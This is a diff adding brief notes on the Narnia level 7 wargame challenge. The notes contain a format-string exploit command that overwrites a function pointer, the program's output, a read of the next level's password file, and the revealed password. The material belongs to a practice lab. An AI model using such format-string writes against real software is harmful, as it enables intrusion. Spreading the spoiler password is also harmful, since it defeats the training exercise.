@@ -1,0 +1,18 @@
+We need to have an integer of 0x56000000 to be placed in the beginning of the function pointer so the function pointer 'ends with' 0x56.
+
+math.sqrt(0x56000000 / 5 ) = 16987
+
+Have a string of 16987 len which will cause a count of 0x56........
+
+
+
+
+narnia7@narnia:/tmp/tmp.mi3Ful0ggh$ /narnia/narnia7 `python -c "print '\x99\x89\xfe\xff' + '%42\\$s' * 16987 + '%6\\$n'"`
+goodfunction() = 0x8048730
+hackedfunction() = 0x8048756
+
+before : ptrf() = 0x8048730 (0xfffe899c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ cat /etc/narnia_pass/narnia8
+mohthuphog
+
